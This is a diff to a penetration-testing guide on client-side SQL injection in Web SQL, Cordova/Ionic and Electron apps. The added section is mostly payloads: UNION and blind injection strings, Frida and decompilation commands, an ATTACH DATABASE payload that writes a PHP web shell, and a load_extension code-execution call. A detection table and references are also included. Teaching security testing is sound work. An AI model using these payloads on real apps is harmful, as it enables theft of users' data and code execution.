@@ -8,8 +8,8 @@ author: cyberstrike-official
 tags: [injection, input-validation, xss, sqli, wstg, inpv]
 tech_stack: []
 cwe_ids: []
-chains_with: []
-prerequisites: []
+chains_with: [wstg-inpv-01, wstg-inpv-02]
+prerequisites: [wstg-conf-01, wstg-conf-02]
 severity_boost: {}
 ---
 
@@ -301,6 +301,91 @@ window.api.searchUsers("' UNION SELECT password FROM users --")
 
 ---
 
+## Example Commands/Payloads
+
+### Web SQL Database (browser console)
+
+```javascript
+// Enumerate a page's Web SQL database from DevTools console
+var db = openDatabase("", "", "", "");
+db.transaction(function (tx) {
+  tx.executeSql("SELECT name FROM sqlite_master WHERE type='table'", [], function (tx, results) {
+    for (var i = 0; i < results.rows.length; i++) console.log(results.rows.item(i).name);
+  });
+});
+
+// Inject through an app-exposed search function that concatenates input
+searchProducts("x' UNION SELECT username,password,3 FROM users--");
+searchProducts("x' OR '1'='1");
+```
+
+### Hybrid Mobile App (Cordova/Ionic) via Frida
+
+```bash
+# Hook SQLite exec calls inside a Cordova/Ionic Android app to log queries
+frida -U -f com.target.app -l hook_sqlite.js --no-pause
+
+# hook_sqlite.js (Frida script) intercepts calls into the app's SQLite bridge
+# and logs the raw query string, revealing string-concatenation injection points.
+
+# Static analysis path: decompile to find vulnerable local DB queries
+apktool d target.apk -o target_decoded
+jadx -d target_jadx target.apk
+grep -rn "rawQuery\|execSQL" target_jadx/sources | grep -v "?"
+```
+
+### Electron App (local SQLite via better-sqlite3 / sql.js)
+
+```bash
+# Statically search bundled app.asar for string-concatenated queries
+npx asar extract app.asar app_extracted
+grep -rn "SELECT .* FROM .*\${" app_extracted --include="*.js"
+grep -rn "db.prepare(\`" app_extracted --include="*.js"
+```
+
+```javascript
+// If a renderer-exposed IPC function passes input straight into a query
+window.api.searchUsers("' OR '1'='1");
+window.api.searchUsers("' UNION SELECT password,2,3 FROM users --");
+```
+
+### SQLite Local RCE via ATTACH DATABASE (Electron / Cordova, if the app's SQLite layer is stacked-query-capable)
+
+If the underlying SQLite call path (e.g. a raw `db.exec()`/multi-statement bridge) allows stacked statements, `ATTACH DATABASE` can plant a web-shell or cron persistence file — treat the local SQLite engine the same as a server-side one once injection is confirmed:
+
+```sql
+ATTACH DATABASE '/var/www/shell.php' AS shell;
+CREATE TABLE shell.pwn (dataz text);
+INSERT INTO shell.pwn (dataz) VALUES ('<?php system($_GET["cmd"]); ?>');--
+```
+
+```sql
+-- load_extension() RCE if the app enabled extension loading (disabled by default)
+SELECT load_extension('/tmp/evil.so','entrypoint');--
+```
+
+### Blind Schema Enumeration (when results aren't rendered directly)
+
+```javascript
+// Boolean-based: compare table name length before extracting characters
+searchProducts("x' AND (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' LIMIT 1)=5 --");
+// Character extraction via hex comparison, avoids quoting issues in the injected string
+searchProducts("x' AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master LIMIT 1)>HEX('a') --");
+```
+
+### Detection Pattern
+
+| Signal | Meaning |
+| ------ | ------- |
+| `SELECT`/`UNION` payload changes the rows returned by a client-exposed search/filter function | Client-side SQL injection into Web SQL / local SQLite confirmed |
+| Frida hook log shows the raw SQL string built via `+`/template-literal concatenation with attacker input | Confirms unsafe query construction inside the app binary |
+| `grep` for `rawQuery(`, `execSQL(`, `` db.prepare(`...${ ``  finds no bound parameters (`?`) | Static confirmation of non-parameterized local DB access |
+| Extracted data (e.g. other users' rows) appears in local storage/UI after injection | Local database boundary bypass — impacts device data confidentiality even without a network round-trip |
+| `ATTACH DATABASE`/multi-statement payload executes without error | Stacked-query capable local SQLite bridge — file write / persistence escalation possible, not just data read |
+| Boolean/hex-comparison payloads against `sqlite_master` change the returned rows | Blind local-schema enumeration works even when query results aren't rendered to the UI |
+
+---
+
 ## Remediation
 
 ```javascript
@@ -361,6 +446,14 @@ function sanitizeForLocalSQL(input) {
 | ---------- | ------------- |
 | **CWE-89** | SQL Injection |
 
+---
+
+## References
+
+- [OWASP WSTG - Testing for SQL Injection (WSTG-INPV-05)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
+- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
+- [PayloadsAllTheThings - SQLite Injection (ATTACH DATABASE, load_extension)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
+- [Web SQL Database (W3C, deprecated but still shipped in Chromium)](https://www.w3.org/TR/webdatabase/)
 
 ---
 
